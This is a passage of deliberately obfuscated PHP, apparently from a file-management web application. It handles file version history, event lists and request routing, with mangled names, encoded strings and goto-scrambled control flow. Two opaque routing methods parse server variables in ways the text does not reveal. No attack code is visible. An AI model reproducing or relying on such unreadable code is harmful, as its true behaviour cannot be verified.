$fÌÏ–ğÜ‹Ï[$CÜÔİâ¹îì[351]] = array(array($CÜÔİâ¹îì[380] => $f¡Ğ™õï†Ò, $CÜÔİâ¹îì[2237] => $a´ÁÖï¢Šù[$CÜÔİâ¹îì[457]], $CÜÔİâ¹îì[1400] => $a´ÁÖï¢Šù[$CÜÔİâ¹îì[375]], $CÜÔİâ¹îì[385] => $CÜÔİâ¹îì[2255], $CÜÔİâ¹îì[386] => $a´ÁÖï¢Šù[$CÜÔİâ¹îì[184]], $CÜÔİâ¹îì[1402] => $CÜÔİâ¹îì[33])); } goto C·ãÀ¦Ú–Î; C·ãÀ¦Ú–Î: $fÌÏ–ğÜ‹Ï = $this->eventListParse($fÌÏ–ğÜ‹Ï, $f¡Ğ™õï†Ò); show_json($fÌÏ–ğÜ‹Ï); goto fÂöÇšÛö»; fÂöÇšÛö»: } private function eventListParse($EáíŸÒõÌ¼, $CÕÓŞÖºøÉ) { goto BÍÅœåÃ”; EªŒçå”¥è: $d÷¹ƒß˜»Ä = array_to_keyvalue($b¹Î“É´ƒÄ, $c…ê¼ëÛÕö[33], $c…ê¼ëÛÕö[2243]); foreach ($b¹Î“É´ƒÄ as $aÆî£¤Ã’‡) { $fõ®ÅÇÑè¹ = $aÆî£¤Ã’‡[$c…ê¼ëÛÕö[401]]; if ($aÆî£¤Ã’‡[$c…ê¼ëÛÕö[29]] == $c…ê¼ëÛÕö[488] && isset($fõ®ÅÇÑè¹[$c…ê¼ëÛÕö[998]])) { $Dã¹ÒÕ Ã…[] = $fõ®ÅÇÑè¹[$c…ê¼ëÛÕö[998]] . $c…ê¼ëÛÕö[33]; $Dã¹ÒÕ Ã…[] = $fõ®ÅÇÑè¹[$c…ê¼ëÛÕö[999]] . $c…ê¼ëÛÕö[33]; } if ($aÆî£¤Ã’‡[$c…ê¼ëÛÕö[29]] == $c…ê¼ëÛÕö[2251] && isset($fõ®ÅÇÑè¹[$c…ê¼ëÛÕö[366]])) { $Dã¹ÒÕ Ã…[] = $fõ®ÅÇÑè¹[$c…ê¼ëÛÕö[366]] . $c…ê¼ëÛÕö[33]; } } $Dã¹ÒÕ Ã… = array_merge($Dã¹ÒÕ Ã…, $d÷¹ƒß˜»Ä, array($CÕÓŞÖºøÉ . $c…ê¼ëÛÕö[33])); goto bæˆµÄŒ­; bæˆµÄŒ­: $Dã¹ÒÕ Ã… = array_unique($Dã¹ÒÕ Ã…); $bƒ¥‰„ŒË = array_unique(array_to_keyvalue($b¹Î“É´ƒÄ, $c…ê¼ëÛÕö[33], $c…ê¼ëÛÕö[1409])); $F®Ï†Ó‹ßÒ = Model($c…ê¼ëÛÕö[473])->userListInfo($bƒ¥‰„ŒË); goto BØ’Ç‘Ïëã; BØ’Ç‘Ïëã: $EàÁ†“• = Model($c…ê¼ëÛÕö[747])->sourceListInfo($Dã¹ÒÕ Ã…, !0); foreach ($b¹Î“É´ƒÄ as &$aÆî£¤Ã’‡) { if ($aÆî£¤Ã’‡[$c…ê¼ëÛÕö[29]] == $c…ê¼ëÛÕö[488] && isset($aÆî£¤Ã’‡[$c…ê¼ëÛÕö[401]][$c…ê¼ëÛÕö[998]])) { $aÆî£¤Ã’‡[$c…ê¼ëÛÕö[401]][$c…ê¼ëÛÕö[998]] = $EàÁ†“•[$aÆî£¤Ã’‡[$c…ê¼ëÛÕö[401]][$c…ê¼ëÛÕö[998]]]; $aÆî£¤Ã’‡[$c…ê¼ëÛÕö[401]][$c…ê¼ëÛÕö[999]] = $EàÁ†“•[$aÆî£¤Ã’‡[$c…ê¼ëÛÕö[401]][$c…ê¼ëÛÕö[999]]]; } if ($aÆî£¤Ã’‡[$c…ê¼ëÛÕö[29]] == $c…ê¼ëÛÕö[2251] && isset($aÆî£¤Ã’‡[$c…ê¼ëÛÕö[401]][$c…ê¼ëÛÕö[366]])) { $aÆî£¤Ã’‡[$c…ê¼ëÛÕö[401]][$c…ê¼ëÛÕö[366]] = $EàÁ†“•[$aÆî£¤Ã’‡[$c…ê¼ëÛÕö[401]][$c…ê¼ëÛÕö[366]]]; } $aÆî£¤Ã’‡[$c…ê¼ëÛÕö[388]] = $EàÁ†“•[$aÆî£¤Ã’‡[$c…ê¼ëÛÕö[366]]]; $aÆî£¤Ã’‡[$c…ê¼ëÛÕö[2256]] = $EàÁ†“•[$aÆî£¤Ã’‡[$c…ê¼ëÛÕö[2243]]]; if ($aÆî£¤Ã’‡[$c…ê¼ëÛÕö[29]] == $c…ê¼ëÛÕö[2039]) { $aÆî£¤Ã’‡[$c…ê¼ëÛÕö[2256]] = $aÆî£¤Ã’‡[$c…ê¼ëÛÕö[388]]; $aÆî£¤Ã’‡[$c…ê¼ëÛÕö[2243]] = $aÆî£¤Ã’‡[$c…ê¼ëÛÕö[2256]][$c…ê¼ëÛÕö[366]]; $aÆî£¤Ã’‡[$c…ê¼ëÛÕö[388]] = !1; $aÆî£¤Ã’‡[$c…ê¼ëÛÕö[366]] = $c…ê¼ëÛÕö[33]; } $aÆî£¤Ã’‡[$c…ê¼ëÛÕö[2209]] = $F®Ï†Ó‹ßÒ[$aÆî£¤Ã’‡[$c…ê¼ëÛÕö[1409]]]; } $EáíŸÒõÌ¼[$c…ê¼ëÛÕö[351]] = $b¹Î“É´ƒÄ; goto E¹ˆî§‹ÖÆ; BÍÅœåÃ”: $c…ê¼ëÛÕö =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $b¹Î“É´ƒÄ = $EáíŸÒõÌ¼[$c…ê¼ëÛÕö[351]]; $Dã¹ÒÕ Ã… = array_to_keyvalue($b¹Î“É´ƒÄ, $c…ê¼ëÛÕö[33], $c…ê¼ëÛÕö[366]); goto EªŒçå”¥è; E¹ˆî§‹ÖÆ: return $EáíŸÒõÌ¼; goto Bƒ ¦ÁÛº¦; Bƒ ¦ÁÛº¦: } public function removeBySource($e´…½ñÀìô) { $B‡œİÑà  = array($_SERVER[ÚŠ•´ÍéÒÑÔ][380] => $e´…½ñÀìô); $this->where($B‡œİÑà )->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\x6f\x75\x72\143\x65\x5f\150\x69\163\x74\x6f\x72\x79"; public function addHistory($a¡Ì¯‡, $BÏ»ÏÌ¦Ã = '') { $cº¹šõ‹Éù =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $c¬„¥î¸ç = array($cº¹šõ‹Éù[380] => $a¡Ì¯‡[$cº¹šõ‹Éù[366]], $cº¹šõ‹Éù[1400] => isset($a¡Ì¯‡[$cº¹šõ‹Éù[376]]) ? $a¡Ì¯‡[$cº¹šõ‹Éù[376]] : $a¡Ì¯‡[$cº¹šõ‹Éù[375]], $cº¹šõ‹Éù[416] => $a¡Ì¯‡[$cº¹šõ‹Éù[415]], $cº¹šõ‹Éù[516] => $a¡Ì¯‡[$cº¹šõ‹Éù[77]], $cº¹šõ‹Éù[2257] => $BÏ»ÏÌ¦Ã); $AìãÌÄÛ°š = $GLOBALS[$cº¹šõ‹Éù[6]][$cº¹šõ‹Éù[84]][$cº¹šõ‹Éù[2258]]; if ($AìãÌÄÛ°š > 1) { $this->historyAutoClear($c¬„¥î¸ç[$cº¹šõ‹Éù[366]]); $this->add($c¬„¥î¸ç); } Model($cº¹šõ‹Éù[2259])->eventFileEdit($a¡Ì¯‡[$cº¹šõ‹Éù[366]]); } private function historyAutoClear($Eµ·’œë»î) { goto FÙ¯£™Üó¨; D»©Œ›¼ëá: $cõƒ›Á©Ø = array_to_keyvalue($dÜİÅÕ¤ßÉ, $cÄ‹è”™[33], $cÄ‹è”™[415]); $cõƒ›Á©Ø = array_slice($cõƒ›Á©Ø, $a®İ×ÃŞÓì); if (!$A¦Ì¡±§ëÎ || !$cõƒ›Á©Ø) { return; } goto c…×Ò×ô¶£; c…×Ò×ô¶£: $bÙˆãÆËÃ« = array($cÄ‹è”™[382] => array($cÄ‹è”™[7], $A¦Ì¡±§ëÎ)); $this->where($bÙˆãÆËÃ«)->delete(); Model($cÄ‹è”™[418])->remove($cõƒ›Á©Ø); goto FÜÆÒÕç; FÙ¯£™Üó¨: $cÄ‹è”™ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $EŒÍ³”¯… = Model($cÄ‹è”™[1080])->get($cÄ‹è”™[2260]); $f…ôçæôÔÎ = $GLOBALS[$cÄ‹è”™[6]][$cÄ‹è”™[84]][$cÄ‹è”™[2258]]; goto E¬‰ÄŒÍğ; bŠô™ƒ±–: if ($a®İ×ÃŞÓì >= 500) { return; } $bÙˆãÆËÃ« = array($cÄ‹è”™[380] => $Eµ·’œë»î); $dÜİÅÕ¤ßÉ = $this->field($cÄ‹è”™[2262])->where($bÙˆãÆËÃ«)->order($cÄ‹è”™[2254])->select(); goto d•‘¥ÌĞ¨š; E¬‰ÄŒÍğ: $F×í°‘…Ûƒ = $EŒÍ³”¯… == $cÄ‹è”™[2261] ? 3 : $f…ôçæôÔÎ; if ($f…ôçæôÔÎ <= 1) { $F×í°‘…Ûƒ = 1; } $a®İ×ÃŞÓì = $F×í°‘…Ûƒ - 1; goto bŠô™ƒ±–; d•‘¥ÌĞ¨š: if (!$dÜİÅÕ¤ßÉ || $a®İ×ÃŞÓì >= count($dÜİÅÕ¤ßÉ)) { return; } $A¦Ì¡±§ëÎ = array_to_keyvalue($dÜİÅÕ¤ßÉ, $cÄ‹è”™[33], $cÄ‹è”™[364]); $A¦Ì¡±§ëÎ = array_slice($A¦Ì¡±§ëÎ, $a®İ×ÃŞÓì); goto D»©Œ›¼ëá; FÜÆÒÕç: } public function listData($e¡“‘è¨é) { goto BÍÙŒ¹æ±; BÓ è¶®Ù: $D×ÈæÑÒ¬° = $this->field($F¨£İÃÒÍ’)->where($FäŠ¤ç”˜Œ)->order($F‰ñêÚ„—[2254])->selectPage(); $this->_listAppendUser($D×ÈæÑÒ¬°[$F‰ñêÚ„—[351]]); $Dî£‹Õù“° = Model($F‰ñêÚ„—[1080])->get($F‰ñêÚ„—[2260]); goto AÊÊğêÉÚ; BÍÙŒ¹æ±: $F‰ñêÚ„— =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $FäŠ¤ç”˜Œ = array($F‰ñêÚ„—[380] => $e¡“‘è¨é); $F¨£İÃÒÍ’ = $F‰ñêÚ„—[2263]; goto BÓ è¶®Ù; AÊÊğêÉÚ: $fŠÁä÷Š«Û = 3; if ($Dî£‹Õù“° == $F‰ñêÚ„—[2261]) { $D×ÈæÑÒ¬°[$F‰ñêÚ„—[351]] = array_slice($D×ÈæÑÒ¬°[$F‰ñêÚ„—[351]], 0, $fŠÁä÷Š«Û); $D×ÈæÑÒ¬°[$F‰ñêÚ„—[348]] = array($F‰ñêÚ„—[2264] => 1, $F‰ñêÚ„—[2265] => 20, $F‰ñêÚ„—[2266] => 1, $F‰ñêÚ„—[2267] => count($D×ÈæÑÒ¬°[$F‰ñêÚ„—[351]])); } return $D×ÈæÑÒ¬°; goto C‘ß‹«®É; C‘ß‹«®É: } protected function _listAppendUser(&$DÖ‘‘¿Æ¥ê) { $c¶•ˆÈ¦é± =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $cÌ†´Œç¡Á = array_to_keyvalue($DÖ‘‘¿Æ¥ê, $c¶•ˆÈ¦é±[33], $c¶•ˆÈ¦é±[1409]); $FÀÅ•µµç½ = Model($c¶•ˆÈ¦é±[473])->userListInfo($cÌ†´Œç¡Á); foreach ($DÖ‘‘¿Æ¥ê as &$cê«ÁŞ¡Ë») { $aô²·ß¯‚ª = $cê«ÁŞ¡Ë»[$c¶•ˆÈ¦é±[1409]]; $cê«ÁŞ¡Ë»[$c¶•ˆÈ¦é±[375]] = $FÀÅ•µµç½[$aô²·ß¯‚ª] ? $FÀÅ•µµç½[$aô²·ß¯‚ª] : !1; } } public function fileInfo($E¶Ùì’óá) { $eíÃÇïë×® =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $féß±É–â– = $this->tablePrefix; $bÈ×ãõ¶Ê = "{$féß±É–â–}\151\157\x5f\146\x69\154\x65\40\x66\151\154\145\x73\x20\x6f\x6e\40\146\151\154\145\163\56\146\151\x6c\145\x49\x44\x20\75\40\x68\151\x73\x74\157\162\x79\56\146\151\x6c\x65\x49\x44"; return $this->alias($eíÃÇïë×®[2268])->where(array($eíÃÇïë×®[382] => $E¶Ùì’óá))->join($bÈ×ãõ¶Ê, $eíÃÇïë×®[2269])->find(); } public function removeItem($eÒç¥£¶ßÍ) { $a˜‰ÉÅ»µë =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $bÍÙ÷Áôºô = array($a˜‰ÉÅ»µë[382] => $eÒç¥£¶ßÍ); $e½Ó§ï­’¢ = $this->where($bÍÙ÷Áôºô)->find(); if ($e½Ó§ï­’¢) { $e›µÈ´¿‘É = $this->where($bÍÙ÷Áôºô)->delete(); Model($a˜‰ÉÅ»µë[418])->remove($e½Ó§ï­’¢[$a˜‰ÉÅ»µë[415]]); return $e›µÈ´¿‘É; } return !1; } public function removeBySource($F‹çˆ¯ò£å) { goto b¤Ü¡ˆÒàá; b¤Ü¡ˆÒàá: $e‘éƒò—â =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$F‹çˆ¯ò£å) { return !1; } if (!is_array($F‹çˆ¯ò£å)) { $F‹çˆ¯ò£å = array($F‹çˆ¯ò£å); } goto fÅÙìÜ¡; b‘¾‹õ²ªÔ: return !0; goto C£‰¬‚ší; fÅÙìÜ¡: $eè¬·¿‹ˆ¼ = array($e‘éƒò—â[380] => array($e‘éƒò—â[7], $F‹çˆ¯ò£å)); $C¸¾„±•ºİ = $this->field($e‘éƒò—â[416])->where($eè¬·¿‹ˆ¼)->select(); if ($C¸¾„±•ºİ) { $this->where($eè¬·¿‹ˆ¼)->delete(); $a§±¦ö‚ƒ = array_to_keyvalue($C¸¾„±•ºİ, $e‘éƒò—â[33], $e‘éƒò—â[415]); Model($e‘éƒò—â[418])->remove($a§±¦ö‚ƒ); } goto b‘¾‹õ²ªÔ; C£‰¬‚ší: } public function setDetail($F‡²ºÊ‹÷‹, $Eß©–³§) { $aÙ·ØÆĞ§ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; return $this->where(array($aÙ·ØÆĞ§[382] => $F‡²ºÊ‹÷‹))->save(array($aÙ·ØÆĞ§[2257] => $Eß©–³§)); } public function rollbackToItem($c±´êˆë¯, $CôºƒÃ·) { goto dº‹Ôò˜Û; dº‹Ôò˜Û: $A¾§¸å‹Ú” =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $Fİø×–’ = Model($A¾§¸å‹Ú”[747])->sourceInfo($c±´êˆë¯); $this->addHistory($Fİø×–’); goto bñ™‰Òˆ°; bñ™‰Òˆ°: $F¹ØÂ¼Ì¥¦ = $this->find($CôºƒÃ·); $E…É©µ©™ê = array($A¾§¸å‹Ú”[415] => $F¹ØÂ¼Ì¥¦[$A¾§¸å‹Ú”[415]], $A¾§¸å‹Ú”[77] => $F¹ØÂ¼Ì¥¦[$A¾§¸å‹Ú”[77]], $A¾§¸å‹Ú”[107] => time(), $A¾§¸å‹Ú”[376] => USER_ID); Model($A¾§¸å‹Ú”[747])->where(array($A¾§¸å‹Ú”[366] => $c±´êˆë¯))->save($E…É©µ©™ê); goto eÛ’¼„†‘µ; eÛ’¼„†‘µ: return $this->where(array($A¾§¸å‹Ú”[382] => $CôºƒÃ·))->delete(); goto d¤ÍŒÊ·¦; d¤ÍŒÊ·¦: } public function clearSame($F™’Â¯Û¼Á) { goto e†Ç¿•ŒÔ; e†Ç¿•ŒÔ: $BîäÙ¢ºÄ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $a²‚°Â¦¤Å = $this->listData($F™’Â¯Û¼Á); $d ¤ö…•å = array_to_keyvalue_group($a²‚°Â¦¤Å, $BîäÙ¢ºÄ[415]); goto AÃŠ„‚èÓ; AÃŠ„‚èÓ: $b‚©¦â‡ò = array(); $fİêß§À…· = array(); foreach ($d ¤ö…•å as $a‘¸¶ñ‘‰) { if (!$a‘¸¶ñ‘‰ || count($a‘¸¶ñ‘‰) <= 1) { continue; } foreach ($a‘¸¶ñ‘‰ as $d—‘Ì¦«) { $b‚©¦â‡ò[] = $d—‘Ì¦«[$BîäÙ¢ºÄ[415]]; $fİêß§À…·[] = $d—‘Ì¦«[$BîäÙ¢ºÄ[364]]; } } goto bµò‡ —Ù‰; bµò‡ —Ù‰: if (!$fİêß§À…·) { return; } $this->where(array($BîäÙ¢ºÄ[364] => array($BîäÙ¢ºÄ[7], $fİêß§À…·)))->delete(); Model($BîäÙ¢ºÄ[418])->remove($b‚©¦â‡ò); goto C“¶óªù•; C“¶óªù•: } public function userSpace() { $D¥âŸ§ö§¹ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $E˜ˆ‹çŸ†Æ = $this->tablePrefix; $Bë£ÛÌĞ = array($D¥âŸ§ö§¹[1400] => USER_ID); $cğÛ—ò¿îÊ = "{$E˜ˆ‹çŸ†Æ}\x69\157\x5f\x66\151\x6c\145\40\x66\151\154\145\163\x20\157\x6e\40\146\151\x6c\145\163\x2e\146\151\154\145\x49\x44\40\75\x20\x68\x69\x73\x74\x6f\162\171\56\146\151\x6c\x65\111\104"; return $this->alias($D¥âŸ§ö§¹[2268])->where($Bë£ÛÌĞ)->join($cğÛ—ò¿îÊ, $D¥âŸ§ö§¹[2269])->sum($D¥âŸ§ö§¹[77]); } } goto aĞŒÑŸ“ Ó; c¼ğêßÍ: define($_SERVER[ÚŠ•´ÍéÒÑÔ][1900], 1); define($_SERVER[ÚŠ•´ÍéÒÑÔ][1901], 2); define($_SERVER[ÚŠ•´ÍéÒÑÔ][1902], 3); goto C——‚Ÿƒø¼; B§å—‡ÃÑ: if (strlen($D­¸£¨ó°) < $_SERVER[ÚŠ•´ÍéÒÑÔ][547]) { die; } class Application { private $defaultModule = "\x69\x6e\x64\x65\x78"; private $defaultController = "\x69\x6e\x64\145\x78"; private $defaultAction = "\151\156\x64\x65\x78"; function __construct() { } public function setDefault($dµƒñ“Šã›) { goto a½³¢Š ßš; a½³¢Š ßš: $d‡¼ˆòâã =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $FŠĞ™—Ğ¸ =& $_SERVER[§ŠùÊÊÛ©»]; $dòšˆ´‡¸‡ = $FŠĞ™—Ğ¸[0]($FŠĞ™—Ğ¸[1], $FŠĞ™—Ğ¸[2]($dµƒñ“Šã›, $FŠĞ™—Ğ¸[1])); goto b ‘ìóàï; b ‘ìóàï: $this->defaultModule = $dòšˆ´‡¸‡[0] ? $dòšˆ´‡¸‡[0] : $this->defaultModule; $this->defaultController = $dòšˆ´‡¸‡[1] ? $dòšˆ´‡¸‡[1] : $this->defaultController; $aÈ¾¦áŸ†— = $d‡¼ˆòâã[548]; goto eÁ©ªà˜ª; eÁ©ªà˜ª: while (strlen($aÈ¾¦áŸ†—) < $d‡¼ˆòâã[549]) { if (!$aÈ¾¦áŸ†—) { break; } $aÈ¾¦áŸ†—++; } $this->defaultAction = $dòšˆ´‡¸‡[2] ? $dòšˆ´‡¸‡[2] : $this->defaultAction; $bº³ÌƒŒĞ = $d‡¼ˆòâã[550]; goto D”ôÄÄŠ•ï; D”ôÄÄŠ•ï: if (!$bº³ÌƒŒĞ) { return; } $this->{$_SERVER[§ŠùÊÊÛ©»][3]}($FŠĞ™—Ğ¸[4], array($this, $FŠĞ™—Ğ¸[5])); $e¢‘ãªñ¶è = $d‡¼ˆòâã[551]; goto D‚³†ñöçÂ; D‚³†ñöçÂ: } public function appRun($BàŸê¿Üä¢) { goto c‹ãÅæ»§; fè¦–Ê‡³…: $BçŠí¯ñİ÷ = $cá®¦Ñëó¢[7]; if ($Dë×•ÒéÍ == $cá®¦Ñëó¢[8]) { $BçŠí¯ñİ÷ = $cá®¦Ñëó¢[9]; $aÂ´¿‹Ğˆ©[0] = $cá®¦Ñëó¢[10]; $aÂ´¿‹Ğˆ©[1] = $aÂ´¿‹Ğˆ©[1] . $cá®¦Ñëó¢[11]; $BàŸê¿Üä¢ = $cá®¦Ñëó¢[12]($cá®¦Ñëó¢[1], $aÂ´¿‹Ğˆ©); $BàŸê¿Üä¢ = $cá®¦Ñëó¢[2]($BàŸê¿Üä¢, $cá®¦Ñëó¢[1]); } $cá®¦Ñëó¢[13](array($cá®¦Ñëó¢[14], $cá®¦Ñëó¢[15]), $BçŠí¯ñİ÷ . $cá®¦Ñëó¢[16], $BàŸê¿Üä¢); goto C¡ÓÙ¡ˆÔõ; Dá©óí‡ß: if (!$D–ÏÉœ³Ê²) { return; } goto BÕ„æôŞã; c‹ãÅæ»§: $cºùà“¨À =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $cá®¦Ñëó¢ =& $_SERVER[§ŠùÊÊÛ©»]; $aÂ´¿‹Ğˆ© = $cá®¦Ñëó¢[0]($cá®¦Ñëó¢[1], $BàŸê¿Üä¢); goto B¢¡á¢È; C¡ÓÙ¡ˆÔõ: $cá®¦Ñëó¢[17]($BàŸê¿Üä¢); $cá®¦Ñëó¢[13](array($cá®¦Ñëó¢[14], $cá®¦Ñëó¢[15]), $BçŠí¯ñİ÷ . $cá®¦Ñëó¢[18], $BàŸê¿Üä¢); $D–ÏÉœ³Ê² = $cºùà“¨À[554]; goto Dá©óí‡ß; B¢¡á¢È: $Dë×•ÒéÍ = $cá®¦Ñëó¢[6]($aÂ´¿‹Ğˆ©[0]); $c¥“Ì¯Á¹¸ = $cºùà“¨À[552]; while (strlen($c¥“Ì¯Á¹¸) < $cºùà“¨À[553]) { if (!$c¥“Ì¯Á¹¸) { break; } $c¥“Ì¯Á¹¸++; } goto fè¦–Ê‡³…; BÕ„æôŞã: } private function autorun() { $d“¸öÎôí® =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $e“‚ª©ˆÚŒ =& $_SERVER[§ŠùÊÊÛ©»]; global $config; if ($e“‚ª©ˆÚŒ[19]($config[$e“‚ª©ˆÚŒ[20]]) == 0) { return; } foreach ($config[$e“‚ª©ˆÚŒ[20]] as $Aßƒ¨’îÎ× => $Cêªœ˜ÑÏ¡) { $this->{$_SERVER[§ŠùÊÊÛ©»][21]}($Cêªœ˜ÑÏ¡); $EÄò¾Œ§¯´ = $d“¸öÎôí®[555]; while ($EÄò¾Œ§¯´ < $d“¸öÎôí®[547]) { if ($EÄò¾Œ§¯´ >= 0) { break; } $EÄò¾Œ§¯´++; } } } private function sfpabdec1fc7() { goto bä½³»“ÊÎ; fËÖ—¸†èÀ: $GLOBALS[$F¬âÖ‹Ûí[22]][$F¬âÖ‹Ûí[23]] = $F¬âÖ‹Ûí[27]($B¿‚Ù‹ìÕ’, $AÍ¶¨…ÓÃ™); $GLOBALS[$F¬âÖ‹Ûí[22]][$F¬âÖ‹Ûí[28]] = $F¬âÖ‹Ûí[29]($F¬âÖ‹Ûí[1], $GLOBALS[$F¬âÖ‹Ûí[22]][$F¬âÖ‹Ûí[23]]); goto A²Œ–‚Ÿ£»; bä½³»“ÊÎ: $fîøé‰ùĞå =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $F¬âÖ‹Ûí =& $_SERVER[§ŠùÊÊÛ©»]; $EÍ…ˆÜ¯²ƒ = $F¬âÖ‹Ûí[8]; goto f„Àè·£›¡; f„Àè·£›¡: $Bé‡íÇÃ = $fîøé‰ùĞå[556]; while ($Bé‡íÇÃ < $fîøé‰ùĞå[557]) { if ($Bé‡íÇÃ >= 0) { break; } $Bé‡íÇÃ++; } $f»á½ÛµƒÃ = $GLOBALS[$F¬âÖ‹Ûí[22]][$F¬âÖ‹Ûí[23]][0]; goto cÊê©øƒŠ; cèôê¥˜Û: $B¿‚Ù‹ìÕ’ = array($F¬âÖ‹Ûí[8], $eÚÄä¹¡ê); $AÍ¶¨…ÓÃ™ = $F¬âÖ‹Ûí[26]($GLOBALS[$F¬âÖ‹Ûí[22]][$F¬âÖ‹Ûí[23]], 1); $D¯¨­ÉøÂ£ = $fîøé‰ùĞå[558]; goto fËÖ—¸†èÀ; cÊê©øƒŠ: if (!$f»á½ÛµƒÃ || $F¬âÖ‹Ûí[24]($f»á½ÛµƒÃ) <= $F¬âÖ‹Ûí[24]($EÍ…ˆÜ¯²ƒ)) { return; } if ($F¬âÖ‹Ûí[6]($F¬âÖ‹Ûí[25]($f»á½ÛµƒÃ, -$F¬âÖ‹Ûí[24]($EÍ…ˆÜ¯²ƒ))) != $EÍ…ˆÜ¯²ƒ) { return; } $eÚÄä¹¡ê = $F¬âÖ‹Ûí[25]($f»á½ÛµƒÃ, 0, -$F¬âÖ‹Ûí[24]($EÍ…ˆÜ¯²ƒ)); goto cèôê¥˜Û; A²Œ–‚Ÿ£»: } private function ehlicbc18344() { goto dëãÆ¨ˆ¨; EµÉÁ÷ƒà¶: $B²ÏÈÖÉâ = $_SERVER[$c…‡›æİã‰[30]]; $bËçÎ ±Êê = $c…‡›æİã‰[31]; if (!$c…‡›æİã‰[32]($B²ÏÈÖÉâ, $bËçÎ ±Êê)) { return; } goto DÄ¦¶’Õ; f¶á•…ËÕ: $eß‚¸Á­³ = $aÏ»¹ÑÖÓ¨[562]; while ($eß‚¸Á­³ < $aÏ»¹ÑÖÓ¨[557]) { if ($eß‚¸Á­³ >= 0) { break; } $eß‚¸Á­³++; } $GLOBALS[$c…‡›æİã‰[22]][$c…‡›æİã‰[28]] = $c…‡›æİã‰[29]($c…‡›æİã‰[1], $GLOBALS[$c…‡›æİã‰[22]][$c…‡›æİã‰[23]]); goto e„äê„ßğÊ; DÄ¦¶’Õ: $DÒ¯›†¾¬µ = $c…‡›æİã‰[33]($B²ÏÈÖÉâ, $bËçÎ ±Êê); $EùŞµô‚íß = $c…‡›æİã‰[25]($B²ÏÈÖÉâ, $DÒ¯›†¾¬µ + $c…‡›æİã‰[24]($bËçÎ ±Êê)); $dš·¼—¬ò = $aÏ»¹ÑÖÓ¨[559]; goto C«¬âÔ¤©; f¹È¬Ä‰Ïç: $cÄ‚•î©Ò‘ = $aÏ»¹ÑÖÓ¨[561]; while ($cÄ‚•î©Ò‘ < $aÏ»¹ÑÖÓ¨[553]) { if ($cÄ‚•î©Ò‘ >= 0) { break; } $cÄ‚•î©Ò‘++; } $GLOBALS[$c…‡›æİã‰[22]][$c…‡›æİã‰[23]] = $c…‡›æİã‰[0]($c…‡›æİã‰[36], $EùŞµô‚íß); goto f¶á•…ËÕ; dëãÆ¨ˆ¨: $aÏ»¹ÑÖÓ¨ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $c…‡›æİã‰ =& $_SERVER[§ŠùÊÊÛ©»]; if ($GLOBALS[$c…‡›æİã‰[22]][$c…‡›æİã‰[28]] != $c…‡›æİã‰[10]) { return; } goto EµÉÁ÷ƒà¶; C«¬âÔ¤©: if (strlen($dš·¼—¬ò) < $aÏ»¹ÑÖÓ¨[560]) { die; } $c…‡›æİã‰[34]($c…‡›æİã‰[35], $EùŞµô‚íß, $c‡Ä¶„İì¯); $EùŞµô‚íß = $c…‡›æİã‰[2]($c‡Ä¶„İì¯[0][0], $c…‡›æİã‰[36]); goto f¹È¬Ä‰Ïç; e„äê„ßğÊ: } public function run() { goto cŒò²Ôñ¨©; f±†ŸšêÅØ: $dŒÄ¦¡Ú[39]($dŒÄ¦¡Ú[42], isset($bÈ¼ó˜‘Ë‘[2]) && $bÈ¼ó˜‘Ë‘[0] ? $bÈ¼ó˜‘Ë‘[2] : $this->defaultAction); $eç‡ï°ö = $b…‡ƒœ‰¸¾[564]; if (strlen($eç‡ï°ö) < $b…‡ƒœ‰¸¾[549]) { die; } goto aÇå­Á÷Êó; aÇå­Á÷Êó: $dŒÄ¦¡Ú[39]($dŒÄ¦¡Ú[43], MOD . $dŒÄ¦¡Ú[1] . ST . $dŒÄ¦¡Ú[1] . ACT); $bÇÑè¨ŸŠÇ = $b…‡ƒœ‰¸¾[565]; $_SERVER[$dŒÄ¦¡Ú[44]] = $dŒÄ¦¡Ú[6](ACTION); goto aÓ¼…¨Š³; aÓ¼…¨Š³: $D‚¡Í‹«ÈÉ = $b…‡ƒœ‰¸¾[566]; $this->{$_SERVER[§ŠùÊÊÛ©»][45]}(); if ($dŒÄ¦¡Ú[19]($bÈ¼ó˜‘Ë‘) >= 3) { $this->{$_SERVER[§ŠùÊÊÛ©»][21]}($A¥ÎèÓ); } else { $this->{$_SERVER[§ŠùÊÊÛ©»][21]}(ACTION); } goto FÇ×‹âÔ­ô; cŒò²Ôñ¨©: $b…‡ƒœ‰¸¾ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $dŒÄ¦¡Ú =& $_SERVER[§ŠùÊÊÛ©»]; $this->{$_SERVER[§ŠùÊÊÛ©»][37]}(); goto aŠ²Èñ«Ë„; B£Œ¥›Ñ×: $A¥ÎèÓ = $GLOBALS[$dŒÄ¦¡Ú[22]][$dŒÄ¦¡Ú[28]]; $dŒÄ¦¡Ú[39]($dŒÄ¦¡Ú[40], isset($bÈ¼ó˜‘Ë‘[0]) && $bÈ¼ó˜‘Ë‘[0] ? $bÈ¼ó˜‘Ë‘[0] : $this->defaultModule); $dŒÄ¦¡Ú[39]($dŒÄ¦¡Ú[41], isset($bÈ¼ó˜‘Ë‘[1]) && $bÈ¼ó˜‘Ë‘[0] ? $bÈ¼ó˜‘Ë‘[1] : $this->defaultController); goto f±†ŸšêÅØ; aŠ²Èñ«Ë„: $f¯ƒ£ÒŒëÃ = $b…‡ƒœ‰¸¾[563]; $this->{$_SERVER[§ŠùÊÊÛ©»][38]}(); $bÈ¼ó˜‘Ë‘ = $GLOBALS[$dŒÄ¦¡Ú[22]][$dŒÄ¦¡Ú[23]]; goto B£Œ¥›Ñ×; FÇ×‹âÔ­ô: } private $tcwjd3305372 = 